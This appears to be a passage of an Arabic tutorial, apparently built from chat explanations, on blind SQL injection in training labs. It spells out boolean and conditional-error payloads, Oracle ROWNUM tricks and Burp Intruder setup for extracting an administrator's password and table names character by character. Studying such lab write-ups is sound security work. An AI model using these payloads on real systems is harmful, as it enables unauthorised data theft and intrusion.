+<p><code>SUBSTRING('secret', 1, 1)</code> تعني: هات الحرف الأول فقط، والنتيجة هي <code>'s'</code>.</p>
+</li>
+<li>
+<p><code>SUBSTRING('secret', 2, 1)</code> تعني: هات الحرف الثاني فقط، والنتيجة هي <code>'e'</code>.</p>
+</li>
+</ul>
+<h4 id="_2"><strong>تحليل الأكواد المحقونة خطوة بخطوة:</strong></h4>
+<ul>
+<li>
+<p><strong>المحاولة الأولى (هل الحرف أكبر من m؟):</strong></p>
+<p>SQL</p>
+<p><code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) &gt; 'm</code></p>
+<ul>
+<li>
+<p><strong>الشرح:</strong> طلبنا من القاعدة جلب كلمة مرور الـ Administrator، واقتطاع <strong>الحرف الأول فقط</strong> منها <code>(1, 1)</code>، وسألنا القاعدة: "هل هذا الحرف أكبر من حرف <code>m</code> في الترتيب الأبجدي؟".</p>
+</li>
+<li>
+<p><strong>النتيجة:</strong> ظهرت جملة "Welcome back". هذا يعني أن الشرط <strong>صحيح (True)</strong>، وعرفنا أن الحرف الأول يقع في النصف الثاني من الحروف الأبجدية (بعد الـ m).</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>المحاولة الثانية (هل الحرف أكبر من t؟):</strong></p>
+<p>SQL</p>
+<p><code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) &gt; 't</code></p>
+<ul>
+<li>
+<p><strong>الشرح:</strong> نضيق الخناق الآن وسألنا: "هل الحرف الأول أكبر من <code>t</code>؟".</p>
+</li>
+<li>
+<p><strong>النتيجة:</strong> لم تظهر جملة "Welcome back". هذا يعني أن الشرط <strong>خاطئ (False)</strong>، وعرفنا أن الحرف ليس أكبر من <code>t</code>. إذن الحرف يقع بين <code>m</code> و <code>t</code>.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>المحاولة الثالثة (هل الحرف يساوي s؟):</strong></p>
+<p>SQL</p>
+<p><code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's</code></p>
+<ul>
+<li>
+<p><strong>الشرح:</strong> بعد تجربة بعض الحروف بين m و t، سألنا مباشرة: "هل الحرف الأول يساوي <code>s</code>؟".</p>
+</li>
+<li>
+<p><strong>النتيجة:</strong> ظهرت جملة "Welcome back"! الشرط <strong>صحيح (True)</strong>. مبروك، لقد عرفت الحرف الأول من كلمة المرور وهو <strong><code>s</code></strong>.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="_3"><strong>ماذا يحدث بعد ذلك؟</strong></h3>
+<p>تنتقل إلى الحرف الثاني بتغيير الرقم في الدالة ليصبح <code>(2, 1)</code> وتكرر نفس العملية:</p>
+<p>SQL</p>
+<pre><code>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 2, 1) = 'a'
+</code></pre>
+<p>وتستمر هكذا بشكل نظامي ومتكرر (Systematically) حتى تستخرج كلمة المرور الكاملة.</p>
+<hr />
+<h3 id="substring_1">تركيبة دالة SUBSTRING</h3>
+<p>الدالة بتاخد 3 أجزاء: <code>SUBSTRING(النص, البداية, الطول)</code></p>
+<ul>
+<li>
+<p><strong>الرقم الأول (البداية - Start):</strong> بيمثل <strong>رقم الحرف (Position)</strong> اللي هنبدأ نقطع من عنده.</p>
+<ul>
+<li>
+<p>يعني لو الرقم <code>1</code>، معناها "ابدأ من الحرف الأول".</p>
+</li>
+<li>
+<p>لو الرقم <code>2</code>، معناها "ابدأ من الحرف الثاني".</p>
+</li>
+<li>
+<p><em>(ملاحظة: SQL بتبدأ العد من 1، مش من 0 زي Python أو أغلب لغات البرمجة).</em></p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>الرقم الثاني (الطول - Length):</strong> بيمثل <strong>عدد الحروف</strong> اللي عاوزين نقتطعها من النص.</p>
+<ul>
+<li>بما إننا بنخمن الباسورد حرفاً بحرف، فاحنا دائماً بنخلي الرقم ده <code>1</code> (يعني هات لي حرف واحد فقط).</li>
+</ul>
+</li>
+</ul>
+<h3 id="_4">مثال للتوضيح:</h3>
+<p>لنفترض أن كلمة المرور اللي طلعت من الجدول هي كلمة <strong><code>carlos</code></strong>:</p>
+<ul>
+<li>
+<p><code>SUBSTRING('carlos', 1, 1)</code></p>
+<ul>
+<li>
+<p>المعنى: ابدأ من الحرف <strong>الأول</strong>، واقطع <strong>حرف واحد</strong>.</p>
+</li>
+<li>
+<p>النتيجة: <code>'c'</code></p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>SUBSTRING('carlos', 2, 1)</code></p>
+<ul>
+<li>
+<p>المعنى: ابدأ من الحرف <strong>الثاني</strong>، واقطع <strong>حرف واحد</strong>.</p>
+</li>
+<li>
+<p>النتيجة: <code>'a'</code></p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>SUBSTRING('carlos', 4, 2)</code> (مثال خارجي للفهم)</p>
+<ul>
+<li>
+<p>المعنى: ابدأ من الحرف <strong>الرابع</strong>، واقطع <strong>حرفين</strong>.</p>
+</li>
+<li>
+<p>النتيجة: <code>'lo'</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>الخلاصة:</strong> في هجوم الحقن الأعمى (Blind SQLi)، احنا بنثبت الرقم الثاني على <code>1</code> (لأننا بنختبر حرف واحد في المرة)، وبنزود الرقم الأول تدريجياً <code>(1, 1)</code> ثم <code>(2, 1)</code> ثم <code>(3, 1)</code> عشان السكريبت يتحرك ويختبر كل حروف كلمة المرور بالترتيب من الشمال لليمين.</p>
+<hr />
+<ol>
+<li>
+<p><strong>المشكلة الأولى (<code>WHERE table_name='User'</code>):</strong> أنت هنا بتطلب من قاعدة البيانات إنها تدور على جدول اسمه <code>User</code> تحديداً. لو أنت لسه مش عارف أسماء الجداول أصلاً، فاستخدام جملة <code>WHERE</code> بالشكل ده هيفشل العملية، لأنك بتدور على حاجة أنت افترضت اسمها مسبقاً.</p>
+</li>
+<li>
+<p><strong>المشكلة الثانية (Subquery returns more than 1 row):</strong> لو مسحنا جملة <code>WHERE</code> علشان نجيب كل الجداول <code>(SELECT table_name FROM information_schema.tables)</code>، الاستعلام ده هيرجع <strong>عشرات أو مئات الجداول</strong> دفعة واحدة. دالة <code>SUBSTRING</code> مصممة إنها تقطع "نص واحد فقط"، فلما تدخلها مئات الأسماء في نفس الوقت، قاعدة البيانات هتطلع خطأ (Error) ومش هتكمل الكود.</p>
+</li>
+</ol>
+<h3 id="limit-offset"><strong>الحل: استخدام <code>LIMIT</code> و <code>OFFSET</code></strong></h3>
+<p>علشان الكود يشتغل، لازم تجبر قاعدة البيانات إنها ترجع لك <strong>اسم جدول واحد فقط في كل مرة</strong>. بنعمل ده عن طريق أوامر التحديد:</p>
+<ul>
+<li>
+<p><strong><code>LIMIT 1</code></strong>: معناها "هات لي نتيجة واحدة فقط".</p>
+</li>
+<li>
+<p><strong><code>OFFSET 0</code></strong>: معناها "ابدأ من النتيجة رقم صفر" (يعني أول جدول في القائمة).</p>
+</li>
+</ul>
+<h4 id="_5"><strong>شكل الكود الصحيح (المفاهيمي):</strong></h4>
+<p>SQL</p>
+<pre><code>' AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0), 1, 1) = 'a'-- -
+</code></pre>
+<h3 id="the-iteration-process"><strong>إزاي تتحرك جوه البيانات؟ (The Iteration Process)</strong></h3>
+<p>بما إنك شغال Blind (أعمى)، أنت هنا محتاج تحرك <strong>ثلاثة أرقام</strong> علشان تستخرج كل أسماء الجداول بالكامل:</p>
+<p><strong>1. تخمين الحرف نفسه (الحرف الأول، الثاني، إلخ):</strong> بتغير الحرف اللي بعد علامة يساوي:</p>
+<ul>
+<li>
+<p><code>... = 'a'</code></p>
+</li>
+<li>
+<p><code>... = 'b'</code></p>
+</li>
+<li>
+<p><code>... = 'c'</code> (لحد ما الموقع يرجع لك استجابة صحيحة "True").</p>
+</li>
+</ul>
+<p><strong>2. التحرك داخل نفس اسم الجدول (من الحرف الأول للثاني):</strong> لما تلاقي الحرف الأول، بتغير الرقم الأول في دالة <code>SUBSTRING</code> علشان تجيب الحرف اللي بعده:</p>
+<ul>
+<li>
+<p>الحرف الأول: <code>SUBSTRING(..., 1, 1)</code></p>
+</li>
+<li>
+<p>الحرف الثاني: <code>SUBSTRING(..., 2, 1)</code></p>
+</li>
+<li>
+<p>الحرف الثالث: <code>SUBSTRING(..., 3, 1)</code> (لحد ما اسم الجدول الأول يخلص).</p>
+</li>
+</ul>
+<p><strong>3. الانتقال للجدول التالي (السر في الـ OFFSET):</strong> بعد ما تخلص تخمين اسم "أول جدول" بالكامل، محتاج تنقل على "تاني جدول" في قاعدة البيانات. هنا بتغير رقم الـ <code>OFFSET</code>:</p>
+<ul>
+<li>
+<p>الجدول الأول: <code>LIMIT 1 OFFSET 0</code></p>
+</li>
+<li>
+<p>الجدول الثاني: <code>LIMIT 1 OFFSET 1</code></p>
+</li>
+<li>
+<p>الجدول الثالث: <code>LIMIT 1 OFFSET 2</code></p>
+</li>
+<li>
+<p>وهكذا...</p>
+</li>
+</ul>
+<p><strong>ملاحظة أخيرة:</strong> عشان كده بالظبط في الـ Blind SQLi بنعتمد على الـ Automation (زي Burp Intruder أو Python Scripts)، لأنك محتاج تعمل آلاف الطلبات عشان تلوب (Loop) على الحروف، وبعدين تلوب على الأعمدة، وبعدين تلوب على الجداول!</p>
+<hr />
+<p>هنا ننتقل إلى مستوى أعلى من التحدي والذكاء في التعامل مع ثغرات الـ Blind SQLi. في الدرس السابق، كنا نعتمد على أن الموقع يغير استجابته (مثل إخفاء أو إظهار كلمة "Welcome back"). لكن ماذا لو كان الموقع "عنيداً" ولا يغير شكل الصفحة أبداً مهما كانت نتيجة الاستعلام؟</p>
+<p>هنا يأتي دور <strong>الحقن المبني على الأخطاء (Error-based SQL Injection)</strong>، وتحديداً استخدام <strong>الأخطاء المشروطة (Conditional Errors)</strong>.</p>
+<p>إليك الشرح المفصل لهذا التكتيك الخبيث:</p>
+<h3 id="1_2"><strong>1. ما هو الحقن المبني على الأخطاء؟</strong></h3>
+<p>بدلاً من الاعتماد على تغير محتوى الصفحة، نحن نحاول إجبار قاعدة البيانات نفسها على إحداث "خطأ برمجي" (Error) يتبعه انهيار جزئي في الصفحة (مثل ظهور رسالة خطأ، أو تحول حالة الصفحة إلى HTTP 500 Internal Server Error).</p>
+<p>النص يقسم هذا الهجوم إلى نوعين:</p>
+<ul>
+<li>
+<p><strong>الأخطاء المرئية (Verbose Errors):</strong> قاعدة البيانات تُرجع رسالة خطأ صريحة تحتوي على البيانات التي نريدها (مثل: "خطأ: المستخدم admin123 غير موجود"). هذا يحول الثغرة من أعمى (Blind) إلى مرئي.</p>
+</li>
+<li>
+<p><strong>الأخطاء المشروطة (Conditional Errors):</strong> وهو موضوعنا هنا. نحن نربط حدوث الخطأ بـ "شرط معين". إذا تحقق الشرط، يحدث الخطأ. وإذا لم يتحقق، تعمل الصفحة بشكل طبيعي.</p>
+</li>
+</ul>
+<h3 id="2-10"><strong>2. الخدعة الرياضية: القسمة على صفر (1/0)</strong></h3>
+<p>في عالم الرياضيات والبرمجة، "القسمة على صفر" عملية مستحيلة وتتسبب في انهيار (Crash) فوري لأي محرك قاعدة بيانات وتوليد خطأ (Divide-by-zero error). نحن سنستخدم هذه الحقيقة كسلاح!</p>
+<p>للقيام بذلك، نستخدم جملة الشرط <strong><code>CASE WHEN</code></strong> المدمجة في لغة SQL، والتي تعمل كالتالي:</p>
+<ul>
+<li>
+<p><code>WHEN</code> (إذا كان الشرط كذا)</p>
+</li>
+<li>
+<p><code>THEN</code> (نفذ كذا)</p>
+</li>
+<li>
+<p><code>ELSE</code> (وإلا، نفذ كذا)</p>
+</li>
+<li>
+<p><code>END</code> (نهاية الجملة)</p>
+</li>
+</ul>
+<h3 id="3-payloads"><strong>3. تحليل أكواد الاستغلال (Payloads)</strong></h3>
+<p>دعنا نحلل الكودين المذكورين في النص لنفهم كيف تتم عملية "الاستجواب":</p>
+<ul>
+<li>
+<p><strong>المحاولة الأولى (شرط خاطئ):</strong></p>
+<p>SQL</p>
+<p><code>xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a</code></p>
+<ul>
+<li>
+<p><strong>المنطق:</strong> نحن نسأل القاعدة "هل 1 تساوي 2؟". الإجابة طبعاً لا (False).</p>
+</li>
+<li>
+<p><strong>النتيجة:</strong> بما أن الشرط لم يتحقق، سيتخطى المحرك أمر الـ <code>THEN</code> ويذهب إلى <code>ELSE</code> ويرجع حرف <code>'a'</code>. وبالتالي يصبح الكود النهائي <code>'a'='a'</code> وهو كود سليم لا يسبب مشاكل. <strong>الصفحة ستعمل بشكل طبيعي.</strong></p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>المحاولة الثانية (شرط صحيح):</strong></p>
+<p>SQL</p>
+<p><code>xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a</code></p>
+<ul>
+<li>
+<p><strong>المنطق:</strong> نحن نسأل "هل 1 تساوي 1؟". الإجابة نعم (True).</p>
+</li>
+<li>
+<p><strong>النتيجة:</strong> بما أن الشرط تحقق، سيقوم المحرك بتنفيذ أمر الـ <code>THEN</code> ويحاول حساب <strong><code>1/0</code></strong>. هنا تنهار قاعدة البيانات وتُصدر خطأ. <strong>الصفحة ستظهر لك رسالة خطأ أو ستسقط.</strong></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-data-extraction_1"><strong>4. دمج التكتيك لاستخراج البيانات (Data Extraction)</strong></h3>
+<p>الآن، نحن نمتلك أداة تجعل الموقع ينهار فقط عندما تكون إجابتنا "نعم". سنقوم بدمج هذا التكتيك مع دالة <code>SUBSTRING</code> التي تعلمناها في الدرس السابق لاستخراج كلمات المرور:</p>
+<p>SQL</p>
+<pre><code>xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) &gt; 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+</code></pre>
+<p><strong>كيف يقرأ السيرفر هذا الهجوم؟</strong></p>
+<ol>
+<li>
+<p>سيذهب لجدول <code>Users</code> ويبحث عن <code>Administrator</code>.</p>
+</li>
+<li>
+<p>سيقتطع الحرف الأول من كلمة المرور <code>SUBSTRING(Password, 1, 1)</code>.</p>
+</li>
+<li>
+<p>سيختبر الشرط: "هل هذا الحرف أكبر من حرف m؟".</p>
+</li>
+<li>
+<p><strong>إذا كان أكبر من m (الشرط صحيح True):</strong> سيحاول قسمة 1 على 0، فيحدث خطأ، وتنهار الصفحة. (عرفنا الإجابة!).</p>
+</li>
+<li>
+<p><strong>إذا لم يكن أكبر من m (الشرط خاطئ False):</strong> سيرجع حرف <code>'a'</code>، وتعمل الصفحة بشكل طبيعي بدون أخطاء. (عرفنا الإجابة أيضاً!).</p>
+</li>
+</ol>
+<p><strong>ملاحظة احترافية:</strong> طريقة <code>1/0</code> ممتازة، ولكن كما أشار النص في نهايته، محركات قواعد البيانات تختلف عن بعضها. بعض الأنظمة قد تتجاهل القسمة على صفر، وفي هذه الحالة نلجأ إلى طرق أخرى لتوليد الأخطاء (مثل استخدام دوال رياضية خاطئة أو تحويل نصوص إلى أرقام بشكل غير قانوني). وهذا ما يجعل الـ SQL Injection Cheat Sheets صديقك المفضل دائماً!</p>
+<hr />
+<p>تفكير سليم وعاش جداً على الشغف ده! إنك تغير سيناريو اللاب وتبدأ من مرحلة <strong>استكشاف أسماء الجداول (Table Enumeration)</strong> بنفسك هي أفضل طريقة لكسر جمود الخطوات الجاهزة وفهم الـ Blind SQLi كأنك في بيئة عمل حقيقية (Black-box Test).</p>
+<p>بما أننا أثبتنا في الخطوات السابقة أن قاعدة البيانات هي <strong>Oracle</strong>، وبما أننا نستخدم الـ <strong>Concatenation (<code>||</code>)</strong> والـ <strong>Error-based (القسمة على صفر المُغلفة بـ <code>TO_CHAR</code>)</strong>، سنقوم بتركيب "السلاح المخصص" لقراءة الجداول.</p>
+<p>في Oracle، يتم تخزين أسماء الجداول في جدول النظام الشهير <strong><code>all_tables</code></strong> أو <strong><code>user_tables</code></strong> (والثاني أسهل لأنه يعرض الجداول الخاصة بالمستخدم الحالي فقط دون جداول النظام المعقدة).</p>
+<p>إليك الأكواد بالترتيب وكيف ستطبقها:</p>
+<h3 id="1_3">الخطوة 1: معرفة طول (عدد حروف) اسم أول جدول</h3>
+<p>قبل أن تخمن الحروف، يفضل أن تعرف اسم الجدول كم حرف لكي تضبط الـ Intruder. سنستخدم دالة <code>LENGTH</code> مع جدول النظام <code>user_tables</code>.</p>
+<ul>
+<li><strong>الكود:</strong></li>
+</ul>
+<p>SQL</p>
+<pre><code>TrackingId=xyz'||(SELECT CASE WHEN LENGTH(table_name)&gt;1 THEN TO_CHAR(1/0) ELSE '' END FROM user_tables WHERE ROWNUM=1)||'
+</code></pre>
+<ul>
+<li>
+<p><strong>لماذا استخدمنا <code>ROWNUM=1</code>؟</strong> لأن جدول <code>user_tables</code> يحتوي على صفوف كثيرة (كل جداول الموقع). بدون تحديد <code>ROWNUM=1</code> سيرجع الاستعلام جداول كثيرة دفعة واحدة ويفشل الـ Concatenation. هذه الجملة تضمن أننا نركز على <strong>أول جدول</strong> في القائمة فقط.</p>
+</li>
+<li>
+<p><strong>التطبيق:</strong> أرسل الطلب لـ <strong>Burp Repeater</strong>، وغير الرقم تدريجياً (<code>&gt;1</code>, <code>&gt;2</code>, <code>&gt;3</code>...) حتى يختفي خطأ الـ 500 ويعود الموقع طبيعياً (200 OK)، عند هذه النقطة ستعرف طول اسم الجدول بالضبط.</p>
+</li>
+</ul>
+<h3 id="2_2">الخطوة 2: استخراج اسم أول جدول (حرفاً بحرف)</h3>
+<p>الآن بعد أن عرفت الطول، سنستخدم دالة <code>SUBSTR</code> الخاصة بـ Oracle لاستخراج الحروف داخل <strong>Burp Intruder</strong>.</p>
+<ul>
+<li><strong>الكود:</strong></li>
+</ul>
+<p>SQL</p>
+<pre><code>TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(table_name,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM user_tables WHERE ROWNUM=1)||'
+</code></pre>
+<ul>
+<li>
+<p><strong>التطبيق في الـ Intruder:</strong></p>
+<ol>
+<li>
+<p>حدد حرف الـ <code>a</code> كـ Payload Position.</p>
+</li>
+<li>
+<p>في قائمة الـ Payloads، أضف الحروف الكبيرة <strong>A-Z</strong> (ملحوظة مهمة جداً: <strong>Oracle تخزن أسماء الجداول بحروف كبيرة دائماً Uppercase</strong>، فلو جربت حروفاً صغيرة لن تنجح!). وأضف معها الأرقام وعلامة الأندر سكور <code>_</code> لأن أسماء الجداول قد تحتوي عليها.</p>
+</li>
+<li>
+<p>ابدأ الهجوم، والحرف الذي يعطيك <strong>HTTP 500</strong> هو الحرف الأول.</p>
+</li>
+<li>
+<p>عد لتعديل الدالة إلى <code>SUBSTR(table_name,2,1)</code> واكتشف الحرف الثاني، وهكذا حتى يكتمل الاسم (مثلاً تجد أن الاسم طلع معك <code>USERS</code>).</p>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="3-oracle">الخطوة 3: كيف ننتقل لاسم الجدول الثاني؟ (الخدعة في Oracle)</h3>
+<p>في المحادثة السابقة، أخبرتك أننا في قواعد البيانات الأخرى نستخدم <code>LIMIT 1 OFFSET 1</code>. لكن <strong>Oracle</strong> (خصوصاً الإصدارات القديمة منها) لا تفهم <code>OFFSET</code> بهذا الشكل البسيط، وتعتمد على <code>ROWNUM</code>.</p>
+<p>إذا أردنا قراءة الجدول الثاني، لا يمكننا كتابة <code>ROWNUM=2</code> مباشرة (لأن ROWNUM في Oracle يتم حسابه ديناميكياً ويبدأ دائماً من 1، فـ <code>ROWNUM=2</code> ستُرجع false دائماً!).</p>
+<p>لحل هذه المعضلة في Oracle، نستخدم <strong>استعلاماً متداخلاً (Nested Query)</strong> لكي نثبت أرقام الصفوف أولاً كأعمدة وهمية، كالتالي:</p>
+<ul>
+<li><strong>كود استخراج الحرف الأول من "الجدول الثاني":</strong></li>
+</ul>
+<p>SQL</p>
+<pre><code>TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(table_name,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM (SELECT table_name, rownum AS rn FROM user_tables) WHERE rn=2)||'
+</code></pre>
+<ul>
+<li>
+<p><strong>الشرح البرمجي:</strong></p>
+<ul>
+<li>
+<p>الجزء <code>(SELECT table_name, rownum AS rn FROM user_tables)</code> يقوم بعمل نسخة مؤقتة من الجداول ويعطي كل جدول رقماً ثابتاً في عمود اسمه <code>rn</code>.</p>
+</li>
+<li>
+<p>الجزء الخارجي <code>WHERE rn=2</code> يقوم الآن باستهداف الجدول الثاني بأمان وبشكل مضمون.</p>
+</li>
+<li>
+<p>إذا أردت الجدول الثالث ستغيرها إلى <code>rn=3</code> وهكذا.</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>بهذه الطريقة، يمكنك كشف الخريطة الكاملة لقاعدة البيانات (Database Schema) واكتشاف أي جداول مخفية لم يذكرها سيناريو اللاب الأصلي! هل واضحة لك فكرة الـ <code>rownum</code> المتداخلة في Oracle؟</p>
+<hr />
+<h3 id="blind-sql-injection-with-conditional-errors-lab">Blind SQL injection with conditional errors LAB:</h3>
+<h3 id="recon-fingerprinting"><strong>المرحلة الأولى: الاستكشاف وبصمة القاعدة (Recon &amp; Fingerprinting)</strong></h3>
+<p>في هذه المرحلة، نحن لا نهاجم، بل نتحسس النظام لنفهم كيف يعمل.</p>
+<ol>
+<li>
+<p><strong>اختبار الثغرة:</strong> بوضع علامة <code>'</code> في الـ <code>TrackingId</code> ظهر خطأ، وبوضع <code>''</code> اختفى الخطأ. هذا يؤكد أن الإدخال غير مفلتر ويؤثر على سياق الـ SQL.</p>
+</li>
+<li>
+<p><strong>تحديد نوع قاعدة البيانات:</strong></p>
+<ul>
+<li>
+<p>حاولنا دمج استعلام فارغ هكذا: <code>'||(SELECT '')||'</code> ولكن ظهر خطأ.</p>
+</li>
+<li>
+<p>هذا يعني أن محرك قاعدة البيانات يرفض استعلام <code>SELECT</code> بدون <code>FROM</code>.</p>
+</li>
+<li>
+<p>قمنا بالتعديل ليصبح: <code>'||(SELECT '' FROM dual)||'</code>. اختفى الخطأ!</p>
+</li>
+<li>
+<p><strong>الاستنتاج:</strong> الهدف يعمل بقاعدة بيانات <strong>Oracle</strong> (لأنها الوحيدة التي تستخدم جدول <code>dual</code> الوهمي)، وأداة الدمج (Concatenation) التي يجب استخدامها هي الـ <code>||</code> بدلاً من <code>AND</code>.</p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="_6"><strong>المرحلة الثانية: تأكيد الهدف</strong></h3>
+<p>نريد التأكد من وجود جدول <code>users</code>.</p>
+<ul>
+<li>
+<p><strong>الكود:</strong> <code>'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</code></p>
+</li>
+<li>
+<p><strong>لماذا <code>ROWNUM = 1</code>؟</strong> لو كان الجدول يحتوي على 10 مستخدمين، فإن الاستعلام سيرجع 10 صفوف. عملية الدمج <code>||</code> لا يمكنها دمج 10 صفوف في مساحة واحدة، وسيحدث خطأ (Error) قد تظن بسببه أن الجدول غير موجود. <code>ROWNUM = 1</code> تجبر القاعدة على إرجاع صف واحد فقط لضمان نجاح الدمج. بما أن الخطأ لم يظهر، فالجدول موجود.</p>
+</li>
+</ul>
+<h3 id="_7"><strong>المرحلة الثالثة: بناء "السلاح" (الخطأ المشروط)</strong></h3>
+<p>هنا يظهر الحل الذكي للمشكلة التي ناقشناها سابقاً بخصوص الـ <code>1/0</code>!</p>
+<ul>
+<li>
+<p><strong>الكود:</strong> <code>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code></p>
+</li>
+<li>
+<p><strong>الخدعة هنا هي <code>TO_CHAR(1/0)</code>:</strong> بدلاً من كتابة <code>1/0</code> وتوليد تعارض بين الأرقام والنصوص (Data Type Mismatch) لأن الـ <code>ELSE</code> ترجع نصاً فارغاً <code>''</code>، قام بوضع دالة <code>TO_CHAR()</code>. هذه الدالة تأخذ ناتج القسمة (سواء كان خطأ أو رقماً) وتغلفه في شكل "نص" (String). بهذه الطريقة، أصبح الـ <code>THEN</code> والـ <code>ELSE</code> كلاهما يُرجعان نصوصاً، وتفادينا أي أخطاء برمجية (Syntax Errors)، وأصبحنا نتحكم بالخطأ الرياضي فقط!</p>
+</li>
+</ul>
+<h3 id="repeater"><strong>المرحلة الرابعة: استخراج طول كلمة المرور (Repeater)</strong></h3>
+<p>قبل أن نستخرج الكلمة حرفاً بحرف، يجب أن نعرف طولها لكي نعرف متى نتوقف.</p>
+<ul>
+<li>
+<p><strong>الكود:</strong> <code>... CASE WHEN LENGTH(password)&gt;1 THEN TO_CHAR(1/0) ...</code></p>
+</li>
+<li>
+<p>ستقوم بزيادة الرقم في Burp Repeater يدوياً (<code>&gt;2</code>, <code>&gt;3</code>, <code>&gt;4</code>...).</p>
+</li>
+<li>
+<p>طالما أنك تستقبل رد <strong>HTTP 500 (Error)</strong>، فهذا يعني أن الشرط <strong>صحيح</strong> (طول الباسورد أكبر من الرقم الذي أدخلته).</p>
+</li>
+<li>
+<p>عندما تصل مثلاً إلى <code>&gt;20</code> وتجد أن الموقع رد بـ <strong>HTTP 200 OK</strong>، فهذا يعني أن الخطأ اختفى وأن الشرط أصبح <strong>خاطئاً</strong>. إذن، الباسورد ليس أكبر من 20. طول الباسورد هو 20 حرفاً.</p>
+</li>
+</ul>
+<h3 id="intruder"><strong>المرحلة الخامسة: استخراج الباسورد بالكامل (Intruder)</strong></h3>
+<p>الآن حان وقت العمل الآلي (Automation) لاستخراج الـ 20 حرفاً باستخدام دالة <code>SUBSTR</code> (النسخة الخاصة بـ Oracle من <code>SUBSTRING</code>).</p>
+<ol>
+<li>
+<p><strong>إعداد الكود:</strong> <code>... CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ...</code></p>
+</li>
+<li>
+<p><strong>إعداد Burp Intruder:</strong></p>
+<ul>
+<li>
+<p>تضع علامة الـ Payload <code>§</code> حول الحرف الأخير فقط ليصبح <code>='§a§'</code>.</p>
+</li>
+<li>
+<p>تختار نوع الهجوم Sniper.</p>
+</li>
+<li>
+<p>في الـ Payloads، تضع الحروف من a-z والأرقام من 0-9.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>تنفيذ الهجوم وتحليل النتائج:</strong></p>
+<ul>
+<li>
+<p>تبدأ الهجوم وتضغط على عمود الـ <code>Status</code> لترتيب النتائج.</p>
+</li>
+<li>
+<p>الحرف الوحيد الذي سيُرجع كود <strong>500 Internal Server Error</strong> هو الحرف الصحيح (لأن الشرط تحقق وتمت القسمة على صفر).</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>التكرار:</strong></p>
+<ul>
+<li>تعود إلى صفحة الإعدادات، وتغير الرقم الأول في دالة القطع ليصبح <code>SUBSTR(password,2,1)</code> للبحث عن الحرف الثاني، وتشغل الهجوم من جديد. وتكرر العملية 20 مرة حتى تجمع الباسورد بالكامل.</li>
+</ul>
+<h3 id="1_4">1. كود الفحص الأولي وكسر السياق</h3>
+</li>
+<li>
+<p><strong>الكود:</strong> <code>TrackingId=xyz'</code></p>
+</li>
+<li>
+<p><strong>شرحه برمجياً:</strong> قمنا بإضافة علامة اقتباس مفردة واحدة زائدة إلى قيمة الـ Cookie الأصلية.</p>
+</li>
+<li>
+<p><strong>لماذا استخدمناه؟</strong> لكسر الاستعلام في الخلفية بشكل متعمد. إذا رد الموقع بخطأ (Error)، فهذا يثبت أن المدخلات تذهب مباشرة إلى محرك قاعدة البيانات بدون فلترة، وهي أول إشارة لوجود ثغرة SQLi.</p>
+</li>
+<li>
+<p><strong>الكود:</strong> <code>TrackingId=xyz''</code></p>
+</li>
+<li>
+<p><strong>شرحه برمجياً:</strong> أضفنا علامتي اقتباس مفردتين متتاليتين. في لغة SQL، الاقتباس المزدوج داخل النص يُفهم على أنه نص عادي وليس نهاية للاستعلام.</p>
+</li>
+<li>
+<p><strong>لماذا استخدمناه؟</strong> لإصلاح السياق الذي كسرناه في الخطوة السابقة. إذا اختفى الخطأ وعادت الصفحة طبيعية، فهذا يؤكد 100% أن الخطأ الأول كان بسبب <strong>SQL Syntax Error</strong> وليس خطأً عاماً في السيرفر.</p>
+</li>
+</ol>
+<h3 id="2-fingerprinting">2. أكواد تحديد نوع قاعدة البيانات (Fingerprinting)</h3>
+<ul>
+<li>
+<p><strong>الكود:</strong> <code>TrackingId=xyz'||(SELECT '')||'</code></p>
+</li>
+<li>
+<p><strong>شرحه برمجياً:</strong> استخدمنا معامل الدمج <code>||</code> لربط الـ Cookie باستعلام فرعي فارغ <code>(SELECT '')</code>.</p>
+</li>
+<li>
+<p><strong>لماذا استخدمناه؟</strong> حاولنا دمج استعلام فرعي لملء الفراغ، ولكن الموقع أرجع خطأ. هذا الخطأ معناه أن المحرك يرفض دالة <code>SELECT</code> بدون تحديد جدول (<code>FROM</code>).</p>
+</li>
+<li>
+<p><strong>الكود:</strong> <code>TrackingId=xyz'||(SELECT '' FROM dual)||'</code></p>
+</li>
+<li>
+<p><strong>شرحه برمجياً:</strong> أضفنا <code>FROM dual</code> للاستعلام السابق، و <code>dual</code> هو جدول وهمي افتراضي موجود في نظام <strong>Oracle</strong> فقط.</p>
+</li>
+<li>
